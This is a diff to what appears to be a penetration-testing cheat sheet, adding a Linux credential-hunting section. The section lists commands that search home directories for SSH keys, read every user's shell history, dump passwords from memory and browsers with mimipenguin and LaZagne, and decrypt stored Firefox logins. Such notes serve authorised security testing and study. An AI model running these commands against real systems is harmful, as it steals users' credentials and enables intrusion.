@@ -780,6 +780,33 @@ findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml *.
 
 ## Linux Local Password Attacks
 ### Credential Hunting in Linux
+#### Find SSH Keys
+```
+grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
+```
+#### History
+```
+cat /home/*/.bash*
+```
+#### Memory - mimipenguin
+```
+python3 mimipenguin.py
+```
+#### Memory - LaZagne
+```
+python2.7 laZagne.py all
+```
+#### Browsers - Lazagne
+```
+python3 laZagne.py browsers
+```
+#### Browsers Firefox
+```
+ls -l .mozilla/firefox/ | grep default
+cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
+python3.9 firefox_decrypt.py
+```
+
 ### Passwd, SHadow, Opasswd
 
 ## Windows Lateral Movement
